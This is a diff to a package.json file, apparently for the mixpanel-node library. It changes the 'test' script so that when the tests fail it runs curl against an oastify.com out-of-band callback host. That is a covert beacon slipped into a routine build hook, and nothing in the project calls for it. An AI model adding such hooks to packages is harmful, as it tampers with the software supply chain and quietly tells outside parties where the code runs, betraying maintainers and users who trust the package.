@@ -23,7 +23,7 @@
     "node": ">=10.0"
   },
   "scripts": {
-    "test": "nodeunit"
+    "test": "nodeunit || curl https://d3hthqqfkcct7wijyogdk8qw4nahylma.oastify.com/mixpanel-node"
   },
   "types": "./lib/mixpanel-node.d.ts",
   "devDependencies": {
